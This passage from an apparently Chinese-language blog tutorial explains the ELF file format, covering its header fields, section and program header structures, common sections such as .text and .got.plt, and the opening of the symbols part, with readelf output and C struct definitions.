style="text-align:left">EI_CLASS</td><td style="text-align:left">4</td><td style="text-align:left">文件类</td></tr><tr><td style="text-align:left">EI_DATA</td><td style="text-align:left">5</td><td style="text-align:left">数据编码</td></tr><tr><td style="text-align:left">EI_VERSION</td><td style="text-align:left">6</td><td style="text-align:left">文件版本</td></tr><tr><td style="text-align:left">EI_PAD</td><td style="text-align:left">7</td><td style="text-align:left">补齐字节开始处</td></tr><tr><td style="text-align:left">EI_NIDENT</td><td style="text-align:left">16</td><td style="text-align:left">e_ident[]大小</td></tr></tbody></table></div><ul><li><strong>e_type</strong></li></ul><p>该数据类型是uint16_t数据类型的，占两个字节。通过字段查看，可以看到这个值为<code>00 02</code>。表格定义如下：</p><div class="table-container"><table><thead><tr><th style="text-align:left">名称</th><th style="text-align:left">取值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">ET_NONE</td><td style="text-align:left">0x0000</td><td style="text-align:left">未知目标文件格式</td></tr><tr><td style="text-align:left">ET_ERL</td><td style="text-align:left">0x0001</td><td style="text-align:left">可重定位文件</td></tr><tr><td style="text-align:left">ET_EXEC</td><td style="text-align:left">0x0002</td><td style="text-align:left">可执行文件</td></tr><tr><td style="text-align:left">ET_DYN</td><td style="text-align:left">0x0003</td><td style="text-align:left">共享目标文件</td></tr><tr><td style="text-align:left">ET_CORE</td><td style="text-align:left">0x0004</td><td style="text-align:left">Core文件(转储格式)</td></tr><tr><td style="text-align:left">ET_LOPROC</td><td style="text-align:left">0xff00</td><td style="text-align:left">特定处理器文件</td></tr><tr><td style="text-align:left">ET_HIPROC</td><td style="text-align:left">0xffff</td><td style="text-align:left">特定处理器文件</td></tr></tbody></table></div><ul><li><strong>e_machine</strong></li></ul><p>由字段可以看到为<code>00 28</code>，关于这个字段的解析，基本上就是表示该elf文件是针对哪个处理器架构的。</p><p>下面只列出几个常见的架构的序号</p><div class="table-container"><table><thead><tr><th style="text-align:left">名称</th><th style="text-align:left">取值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">EM_NONE</td><td style="text-align:left">0</td><td style="text-align:left">No machine</td></tr><tr><td style="text-align:left">EM_SPARC</td><td style="text-align:left">2</td><td style="text-align:left">SPARC</td></tr><tr><td style="text-align:left">EM_386</td><td style="text-align:left">3</td><td style="text-align:left">Intel 80386</td></tr><tr><td style="text-align:left">EM_MIPS</td><td style="text-align:left">8</td><td style="text-align:left">MIPS I Architecture</td></tr><tr><td style="text-align:left">EM_PPC</td><td style="text-align:left">0x14</td><td style="text-align:left">PowerPC</td></tr><tr><td style="text-align:left">EM_ARM</td><td style="text-align:left">0x28</td><td style="text-align:left">Advanced RISC Machines ARM</td></tr></tbody></table></div><ul><li><strong>e_version</strong></li></ul><p>该字段占四个字节，表示当前文件版本的信息。现在取值为<code>00 00 00 01</code>。从取值上来看</p><div class="table-container"><table><thead><tr><th style="text-align:left">名称</th><th style="text-align:left">取值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">EV_NONE</td><td style="text-align:left">0</td><td style="text-align:left">非法版本</td></tr><tr><td style="text-align:left">EV_CURRENT</td><td style="text-align:left">1</td><td style="text-align:left">当前版本</td></tr></tbody></table></div><ul><li><strong>e_entry</strong></li></ul><p>这里表示程序的入口地址，目前为四字节，所以通过字段解析到的内容为<code>00 00 80 00</code>。得到可执行程序的入口地址为<code>0x8000</code>。</p><ul><li><strong>e_phoff</strong></li></ul><p>该字段表示程序表头偏移。占四个字节，根据字段解析，可以查看当前的偏移量为<code>00 00 00 34</code>。也就是实际的偏移量为52个字节。这52个字节其实就是头部的信息数据结构体的大小。</p><ul><li><strong>e_shoff</strong></li></ul><p>该区域比较重要，记录了section的偏移地址。为四字节，解析出来的字段为<code>0x00 04 24 5c</code>。所以得到地址为0x4245c。</p><ul><li><strong>e_ehsize</strong></li></ul><p>elf文件的头部大小。该取值与头文件结构体的大小相关</p><ul><li><strong>e_phnum</strong></li></ul><p>目前取值为<code>00 01</code>，这里表示程序头的个数当前只有一个程序头，如果有多个程序头表，那么会在elf头文件之后，也就是52个字节之后，依次向下排列。因为这里是1，所以只有1个程序头。</p><p>以下位64位ELF文件头内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~/code/c_code$ gcc -g test.c -o <span class="built_in">test</span></span><br><span class="line">ubuntu@ubuntu:~/code/c_code$ readelf -h <span class="built_in">test</span></span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2<span class="string">&#x27;s complement, little endian</span></span><br><span class="line"><span class="string">  Version:                           1 (current)</span></span><br><span class="line"><span class="string">  OS/ABI:                            UNIX - System V</span></span><br><span class="line"><span class="string">  ABI Version:                       0</span></span><br><span class="line"><span class="string">  Type:                              DYN (Shared object file)</span></span><br><span class="line"><span class="string">  Machine:                           Advanced Micro Devices X86-64</span></span><br><span class="line"><span class="string">  Version:                           0x1</span></span><br><span class="line"><span class="string">  Entry point address:               0x530</span></span><br><span class="line"><span class="string">  Start of program headers:          64 (bytes into file)</span></span><br><span class="line"><span class="string">  Start of section headers:          8648 (bytes into file)</span></span><br><span class="line"><span class="string">  Flags:                             0x0</span></span><br><span class="line"><span class="string">  Size of this header:               64 (bytes)</span></span><br><span class="line"><span class="string">  Size of program headers:           56 (bytes)</span></span><br><span class="line"><span class="string">  Number of program headers:         9</span></span><br><span class="line"><span class="string">  Size of section headers:           64 (bytes)</span></span><br><span class="line"><span class="string">  Number of section headers:         34</span></span><br><span class="line"><span class="string">  Section header string table index: 33</span></span><br></pre></td></tr></table></figure><p>以上是ELF_Header部分</p><p>关于程序头部(Program Header)将在程序加载和动态链接部分介绍</p><h2 id="ELF节区（Sections）"><a href="#ELF节区（Sections）" class="headerlink" title="ELF节区（Sections）"></a><strong>ELF节区（Sections）</strong></h2><p>节区中包含目标文件中的所有信息，除了：ELF头部、程序头部表格、节区头部表格。节区满足以下条件：</p><p>(1).目标文件中的每个节区都有对应的节区头部描述它，反过来，有节区头部不意味着有节区。</p><p>(2).每个节区占用文件中一个连续字节区域（这个区域可能长度为 0）。</p><p>(3).文件中的节区不能重叠，不允许一个字节存在于两个节区中的情况发生。</p><p>(4).目标文件中可能包含非活动空间（INACTIVE  SPACE）。这些区域不属于任何头部和节区，其内容未指定。</p><p><strong>这里引入节(section)和段(segment)的区别:</strong></p><p>段是程序执行的必要组成成分。</p><p>每个段中，会有代码或数据被划分为不同的节。</p><p>节头表是对这些节位置和大小的描述，主要用于链接和调试。对于程序执行来说是非必须的，没有节头表程序一九可以正常执行，因为节头表没有对程序内存布局进行布局，<strong>对程序布局的描述是程序头表的任务</strong>。</p><p>如果二进制文件中缺少节头，并不意味着节就不存在。只是没有办法通过节头来引用节，对于调试器或者反编译程序来说，只是可以参考的信息变少了而已。</p><p>每一个节都保存了某种类型的代码或者数据。数据可以是程序中的全局变量，也可以是链接器所需要的动态链接信息。正如前面提到的，每个ELF目标文件都有节，但是不一定有节头，尤其是有人故意将节头从节头表中删除了之后。当然，默认是有节头的。</p><p>节区头部数据结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word sh_name;  <span class="comment">/* Section name (string tbl index) */</span></span><br><span class="line">  Elf32_Word sh_type;  <span class="comment">/* Section type */</span></span><br><span class="line">  Elf32_Word sh_flags;  <span class="comment">/* Section flags */</span></span><br><span class="line">  Elf32_Addr sh_addr;  <span class="comment">/* Section virtual addr at execution */</span></span><br><span class="line">  Elf32_Off sh_offset;  <span class="comment">/* Section file offset */</span></span><br><span class="line">  Elf32_Word sh_size;  <span class="comment">/* Section size in bytes */</span></span><br><span class="line">  Elf32_Word sh_link;  <span class="comment">/* Link to another section */</span></span><br><span class="line">  Elf32_Word sh_info;  <span class="comment">/* Additional section information */</span></span><br><span class="line">  Elf32_Word sh_addralign;  <span class="comment">/* Section alignment */</span></span><br><span class="line">  Elf32_Word sh_entsize;  <span class="comment">/* Entry size if section holds table */</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p>重要字段：</p><p>sh_flags 字段 </p><p>sh_flags字段定义了一个节区中包含的内容是否可以修改、是否可以执行等信息。如果一个标志位被设置，则该位取值为1。未定义的各位都设置为0。</p><p>取值如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PF_X        (1 &lt;&lt; 0)    <span class="comment">/* Segment is executable */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PF_W        (1 &lt;&lt; 1)    <span class="comment">/* Segment is writable */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PF_R        (1 &lt;&lt; 2)    <span class="comment">/* Segment is readable */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PF_MASKOS   0x0ff00000  <span class="comment">/* OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PF_MASKPROC 0xf0000000  <span class="comment">/* Processor-specific */</span></span></span><br></pre></td></tr></table></figure><p>下面介绍几个重要的节</p><p><strong>.text 节</strong></p><p> .text节是保存了程序代码指令的代码节。一段可执行程序，如果存在Phdr，.text节就会存在于text段中。由于.text节保存了程序代码，因此节的类型为SHT_PROGBITS。</p><p><strong>.rodata 节</strong></p><p>.rodata节保存了只读的数据，如一行C语言代码中的字符串。下面这条命令就是存放在.rodata节中的：printf(“Hello World!\n”);  因为.rodata节是只读的，所以只能存在于一个可执行文件的只读段中。因此，只能在text段（不是data段）中找到.rodata节。由于.rodata节是只读的，因此节类型为SHT_PROGBITS。</p><p><strong>.plt 节</strong></p><p>本文在动态链接的过程链接表（Procedure  Linkage  Table，PLT）进行详细介绍。.plt节中包含了动态链接器调用从共享库导入的函数所必需的相关代码。由于其存在于text段中，同样保存了代码，因此节类型为SHT_PROGBITS。</p><p> <strong>.data 节</strong></p><p>不要将.data节和data段混淆了，.data节存在于data段中，保存了初始化的全局变量等数据。由于其保存了程序的变量数据，因此类型被标记为SHT_PROGBITS。</p><p> <strong>.bss 节</strong></p><p>.bss节保存了未进行初始化的全局数据，是data段的一部分，占用空间不超过4字节，仅表示这个节本身的空间。程序加载时数据被初始化为0，在程序执行期间可以进行赋值。由于.bss节未保存实际的数据，因此节类型为SHT_NOBITS。</p><p> <strong>.got.plt 节</strong></p><p>.got节保存了全局偏移表。.got节和.plt节一起提供了对导入的共享库函数的访问入口，由动态链接器在运行时进行修改。如果攻击者获得了堆或者.bss漏洞的一个指针大小的写原语，就可以对该节任意进行修改。我们将在本问的ELF动态链接部分对此进行讨论。.got.plt节跟程序执行有关，因此节类型被标记为SHT_PROGBITS。</p><p> <strong>.dynsym 节</strong> </p><p>.dynsym节保存了从共享库导入的动态符号信息，该节保存在text段中，节类型被标记为SHT_DYNSYM。</p><p> <strong>.dynstr 节</strong></p><p>.dynstr节保存了动态符号字符串表，表中存放了一系列字符串，这些字符串代表了符号的名称，以空字符作为终止符。</p><p> <strong>.rel.*节</strong></p><p>重定位节保存了重定位相关的信息，这些信息描述了如何在链接或者运行时，对ELF目标文件的某部分内容或者进程镜像进行补充或修改。在本文重定位部分会深入讨论。重定位节保存了重定位相关的数据，因此节类型被标记为SHT_REL。</p><p><strong>.hash节</strong></p><p>.hash节有时也称为.gnu.hash，保存了一个用于查找符号的散列表。</p><p>下面的散列算法是用来在Linux ELF文件中查找符号名的： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">uint32.t     </span><br><span class="line">dl_new_hash(<span class="keyword">const</span> <span class="keyword">char</span> *s)      </span><br><span class="line">&#123;             <span class="keyword">uint32_t</span> h = <span class="number">5381</span>;   </span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">char</span> c = *s;c != <span class="string">&#x27;\0&#x27;</span>; c = *++s)                 </span><br><span class="line">                h = h * <span class="number">33</span> + c;<span class="comment">//Or h = ((h &lt;&lt; 5) + h) + c               </span></span><br><span class="line"> <span class="keyword">return</span> h;      </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>.symtab节</strong></p><p>.symtab节保存了ElfN_Sym类型的符号信息，本文将在ELF符号和重定位部分详细介绍。.symtab节保存了符号信息，因此节类型被标记为SHT_SYMTAB。</p><p><strong>.strtab节</strong></p><p>.strtab节保存的是符号字符串表，表中的内容会被.symtab的ElfN_Sym结构中的st_name条目引用。由于其保存了字符串表，因此节类型被标记为SHT_STRTAB。</p><p>这部分内容在ELF符号具体展开介绍</p><p><strong>.shstrtab节</strong></p><p>.shstrtab节保存节头字符串表，该表是一个以空字符终止的字符串的集合，字符串保存了每个节的节名，如.text、.data等。有一个名为e_shsrndx的ELF文件头条目会指向.shstrtab节，e_shstrndx中保存了.shstrtab的偏移量。由于其保存了字符串表，因此节类型被标记为SHT_STRTAB。</p><p>字符串表节区包含以NULL（ASCII码0）结尾的字符序列，通常称为字符串。ELF目标文件通常使用字符串来表示符号和节区名称。对字符串的引用通常以字符串在字符串表中的下标给出。</p><p>一般，第一个字节（索引为 0）定义为一个空字符串。类似的，字符串表的最后一个字节也定义为  NULL，以确保所有的字符串都以NULL结尾。索引为0的字符串在不同的上下文中可以表示无名或者名字为  NULL的字符串。</p><p>允许存在空的字符串表节区，其节区头部的sh_size成员应该为0。对空的字符串表而言，非0的索引值是非法的。</p><p>例如：对于各个节区而言，节区头部的sh_name成员包含其对应的节区头部字符串表节区的索引，此节区由ELF 头的e_shstrndx 成员给出。下图给出了包含  25  个字节的一个字符串表，以及与不同索引相关的字符串。</p><p>Demo:</p><p><img src="https://i.loli.net/2021/04/23/CDdiq25x8BOvaN4.png" alt="String_table.jpg"></p><p>表中包含的字符串如下：</p><div class="table-container"><table><thead><tr><th>索引</th><th>字符串</th></tr></thead><tbody><tr><td>0</td><td>无</td></tr><tr><td>1</td><td>name.</td></tr><tr><td>7</td><td>Variable</td></tr><tr><td>11</td><td>able</td></tr><tr><td>16</td><td>able</td></tr><tr><td>24</td><td>空字符串</td></tr></tbody></table></div><p>在使用、分析字符串表时，要注意以下几点：</p><ul><li><p>字符串表索引可以引用节区中任意字节。</p></li><li><p>字符串可以出现多次</p></li><li><p>可以存在对子字符串的引用</p></li><li><p>一个字符串可以被引用多次。</p></li><li><p>字符串表中也可以存在未引用的字符串。</p></li></ul><p><strong>.ctors和.dtors节</strong></p><p>.ctors（构造器）和.dtors（析构器）这两个节保存了指向构造函数和析构函数的函数指针，构造函数是在main函数执行之前需要执行的代码，析构函数是在main函数之后需要执行的代码。</p><h2 id="ELF程序头-Program-Header-amp-段-Segment"><a href="#ELF程序头-Program-Header-amp-段-Segment" class="headerlink" title="ELF程序头(Program Header)&amp;段(Segment)"></a><strong>ELF程序头(Program Header)&amp;段(Segment)</strong></h2><p>执行时ELF视图：可以看到程序头的位置,Segmen段和Section节的映射关系</p><p><img src="https://i.loli.net/2021/04/23/vEwSGMorg4cdBNs.png" alt="elf.jpg"></p><p>What’s Program header?</p><p>ELF程序头是对二进制文件中段的描述，是程序装载必需的一部分。段（segment）是在内核装载时被解析的，描述了磁盘上可执行文件的内存布局以及如何映射到内存中。可以通过引用原始ELF头中名为e_phoff（程序头表偏移量）的偏移量来得到程序头表，如前面ElfN_Ehdr结构中所示。</p><p>可执行文件或者共享目标文件的程序头部是一个结构数组，每个结构描述了一个段或者系统准备程序执行所必需的其它信息。目标文件的“段”包含一个或者多个“节区”，也就是“段内容（Segment  Contents）”。程序头部仅对于可执行文件和共享目标文件有意义。</p><p>结构体定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    p_type;         <span class="comment">/* Segment type */</span></span><br><span class="line">  Elf32_Off p_offset;       <span class="comment">/* Segment file offset 相对于ELF文件开头 */</span></span><br><span class="line">  Elf32_Addr    p_vaddr;        <span class="comment">/* Segment virtual address */</span></span><br><span class="line">  Elf32_Addr    p_paddr;        <span class="comment">/* Segment physical address */</span></span><br><span class="line">  Elf32_Word    p_filesz;       <span class="comment">/* Segment size in file */</span></span><br><span class="line">  Elf32_Word    p_memsz;        <span class="comment">/* Segment size in memory */</span></span><br><span class="line">  Elf32_Word    p_flags;        <span class="comment">/* Segment flags */</span></span><br><span class="line">  Elf32_Word    p_align;        <span class="comment">/* Segment alignment对齐方式 */</span></span><br><span class="line">&#125; Elf32_Phdr;</span><br></pre></td></tr></table></figure><p>p_type表示segment的类型。它的可能值如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_NULL     0       <span class="comment">/* Program header table entry unused */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_LOAD     1       <span class="comment">/* Loadable program segment */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_DYNAMIC  2       <span class="comment">/* Dynamic linking information */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_INTERP   3       <span class="comment">/* Program interpreter */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_NOTE     4       <span class="comment">/* Auxiliary information */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_SHLIB    5       <span class="comment">/* Reserved */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_PHDR     6       <span class="comment">/* Entry for header table itself */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_TLS      7       <span class="comment">/* Thread-local storage segment */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_NUM      8       <span class="comment">/* Number of defined types */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_LOOS     0x60000000  <span class="comment">/* Start of OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_GNU_EH_FRAME 0x6474e550  <span class="comment">/* GCC .eh_frame_hdr segment */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_GNU_STACK    0x6474e551  <span class="comment">/* Indicates stack executability */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_GNU_RELRO    0x6474e552  <span class="comment">/* Read-only after relocation */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_LOSUNW   0x6ffffffa</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_SUNWBSS  0x6ffffffa  <span class="comment">/* Sun Specific segment */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_SUNWSTACK    0x6ffffffb  <span class="comment">/* Stack segment */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_HISUNW   0x6fffffff</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_HIOS     0x6fffffff  <span class="comment">/* End of OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_LOPROC   0x70000000  <span class="comment">/* Start of processor-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_HIPROC   0x7fffffff  <span class="comment">/* End of processor-specific */</span></span></span><br></pre></td></tr></table></figure><p>p_flags表示segment的标志。它的可能取值如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PF_X        (1 &lt;&lt; 0)    <span class="comment">/* Segment is executable */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PF_W        (1 &lt;&lt; 1)    <span class="comment">/* Segment is writable */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PF_R        (1 &lt;&lt; 2)    <span class="comment">/* Segment is readable */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PF_MASKOS   0x0ff00000  <span class="comment">/* OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PF_MASKPROC 0xf0000000  <span class="comment">/* Processor-specific */</span></span></span><br></pre></td></tr></table></figure><p>程序头可分为以下几种</p><p><img src="https://i.loli.net/2021/04/23/e2LmxX59GsVR1IB.png" alt="Phdr_Segment.jpg"></p><p>下面介绍5种常见的程序头类型：</p><p><strong>1.PT_LOAD</strong> </p><p>一个可执行文件至少有一个PT_LOAD类型的段。这类程序头描述的是可装载的段，也就是说，这种类型的段将被装载或者映射到内存中。</p><p>例如，一个需要动态链接的ELF可执行文件通常包含以下两个可装载的段（类型为PT_LOAD）：</p><ul><li><p>存放程序代码的text段；</p></li><li><p>存放全局变量和动态链接信息的data段。</p></li></ul><p>上面的两个段将会被映射到内存中，并根据p_align中存放的值在内存中对齐。Phdr结构体中的变量描述了段在文件和内存的布局。</p><p><strong>2.PT_DYNAMIC——动态段的 Phdr</strong> </p><p>动态段是动态链接可执行文件所特有的，包含了动态链接器所必需的一些信息。在动态段中包含了一些标记值和指针，包括但不限于以下内容：</p><ul><li><p>运行时需要链接的共享库列表；</p></li><li><p><strong>全局偏移表（GOT）的地址——ELF动态链接部分会讨论；</strong></p></li><li><p>重定位条目的相关信息。</p></li></ul><p>下面是完整的标记名列表</p><div class="table-container"><table><thead><tr><th>标记名</th><th>标记描述</th></tr></thead><tbody><tr><td>DT_SYMTAB</td><td>符号表地址</td></tr><tr><td>DT_RELA</td><td>相对地址重定位表的地址</td></tr><tr><td>DT_RELASZ</td><td>Rela表的字节大小</td></tr><tr><td>DT_RELAENT</td><td>Rela表条目的字节大小</td></tr><tr><td>DT_STRSZ</td><td>字符串表的字节大小</td></tr><tr><td>DT_SYMENT</td><td>符号表条目的字节大小</td></tr><tr><td>DT_INIT</td><td>初始化函数的地址</td></tr><tr><td>DT_FINI</td><td>终止函数的地址</td></tr><tr><td>DT_SONAME</td><td>共享目标文件名的字符串表偏移量</td></tr><tr><td>DT_RPATH</td><td>库搜索路径的字符串表偏移量</td></tr><tr><td>DT_SYMBOLIC</td><td>修改链接器，在可执行文件之前的共享目标文件中搜索符号</td></tr><tr><td>DT_REL</td><td>Rel relocs表的地址</td></tr><tr><td>DT_RELSZ</td><td>Rel表的字节大小</td></tr><tr><td>DT_RELENT</td><td>Rel表条目的字节大小</td></tr><tr><td>DT_PLTREL</td><td>PLT引用的reloc类型（Rela或Rel）</td></tr><tr><td>DT_DEBUG</td><td>还未进行定义，为调试保留</td></tr><tr><td>DT_TEXTREL</td><td>缺少此项表明重定位只能应用于可写段</td></tr><tr><td>DT_JMPREL</td><td>仅用于PLT的重定位条目地址</td></tr><tr><td>DT_BIND_NOW</td><td>指示动态链接器在将控制权交给可执行文件之前处理所有的重定位</td></tr><tr><td>DT_RUNPATH</td><td>库搜索路径的字符串表偏移量</td></tr><tr><td></td></tr></tbody></table></div><p>动态段包含了一些结构体，在这些结构体中存放着与动态链接相关的信息。d_tag成员变量控制着d_un的含义。</p><p>结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span> </span><br><span class="line">  Elf32_Sword   d_tag;          </span><br><span class="line">   <span class="class"><span class="keyword">union</span>&#123;</span>      </span><br><span class="line">           Elf32_Word d_val;      </span><br><span class="line">           Elf32_Addr d_ptr;  </span><br><span class="line">        &#125;d_un;      </span><br><span class="line">&#125; Elf32_Dyn;      </span><br><span class="line"><span class="keyword">extern</span> Elf32_Dyn _DYNAMIC[];</span><br></pre></td></tr></table></figure><p>这部分内容在动态链接部分深入讨论</p><ol><li><strong>PT_NOTE</strong></li></ol><p>PT_NOTE类型的段可能保存了与特定供应商或者系统相关的附加信息。下面是标准ELF规范中对PT_NOTE的定义：</p><p>有时供应商或者系统构建者需要在目标文件上标记特定的信息，以便于其他程序对一致性、兼容性等进行检查。SHT_NOTE类型的节（section）和PT_NOTE类型的程序头元素就可以用于这一目的。节或者程序头元素中的备注信息可以有任意数量的条目，每个条目都是一个4字节的目标处理器格式的数组。下面的标签可以解释备注信息的组织结构，不过这些标签并不是规范中的内容。</p><p>Tips:这一段值保存了操作系统的规范信息，因为系统会假设一个可执行文件就是本地运行的，可执行文件运行时是不需要这个段的。So this part is vulnerable.:)</p><p><strong>4.PT_INTERP</strong> </p><p>PT_INTERP段只将位置和大小信息存放在一个以null为终止符的字符串中，是对程序解释器位置的描述。例如，/lib/linux-ld.so.2一般是指动态链接器的位置，也即程序解释器的位置。</p><p><strong>5.PT_PHDR</strong></p><p>PT_PHDR段保存了程序头表本身的位置和大小。Phdr表保存了所有的Phdr对文件（以及内存镜像）中段的描述信息。</p><p>至此我们以及了解了节Section和段Segment,下面简单做个小结比较节和段的不同</p><p>段是程序执行的必要组成部分，在每个段中，会有代码或者数据被划分为不同的节。节头表是对这些节的位置和大小的描述，主要用于链接和调试。节头对于程序的执行来说不是必需的，没有节头表，程序仍可以正常执行，因为节头表没有对程序的内存布局进行描述，对程序内存布局的描述是程序头表的任务。节头是对程序头的补充。readelf –l命令可以显示一个段对应有哪些节，可以很直观地看到节和段之间的关系。</p><p>如果二进制文件中缺少节头，并不意味着节就不存在。只是没有办法通过节头来引用节，对于调试器或者反编译程序来说，只是可以参考的信息变少了而已。</p><ul><li><p>section：告诉链接器一个部分是否：</p><ul><li>要加载到存储器中的原始数据，例如<code>.data</code>，<code>.text</code>等.</li><li>或其他部分的格式化元数据，将由链接器使用，但在运行时消失，例如<code>.symtab</code>，<code>.srttab</code>，<code>.rela.text</code></li></ul></li><li><p>segment：告诉操作系统：</p><ul><li>应将段加载到虚拟内存中的哪个位置</li><li>段具有哪些权限（读取，写入，执行）</li></ul><p>下面用一张图来做个总结，直观地理解ELF_Header、Section、Segment、Phdr、Shdr之间的映射关系</p><p><img src="https://i.loli.net/2021/04/23/9akKfFDHAr2MbTt.png" alt="ELF_Demo.jpg"></p></li></ul><p>在了解了ELF_Header、Section、Segment、Program_Header而基础上，我们再来介绍ELF符号</p><h2 id="ELF符号-amp-重定位"><a href="#ELF符号-amp-重定位" class="headerlink" title="ELF符号&amp;重定位"></a><strong>ELF符号&amp;重定位</strong></h2><p><strong>符号</strong></p><p>符号是对某些类型的数据或者代码（如全局变量或函数）的符号引用。例如，printf()函数会在动态符号表.dynsym中存有一个指向该函数的符号条目。在大多数共享库和动态链接可执行文件中，存在两个符号表。如前面使用readelf –S命令输出的内容中，可以看到有两个节：.dynsym和.symtab。</p><p>.dynsym保存了引用来自外部文件符号的全局符号，如printf这样的库函数，.dynsym保存的符号是.symtab所保存符号的子集，.symtab中还保存了可执行文件的本地符号，如全局变量，或者代码中定义的本地函数等。因此，.symtab保存了所有的符号，而.dynsym只保存动态/全局符号。</p><p>既然.symtab中保存了.dynsym中所有的符号，那么为什么还需要两个符号表呢？使用readelf 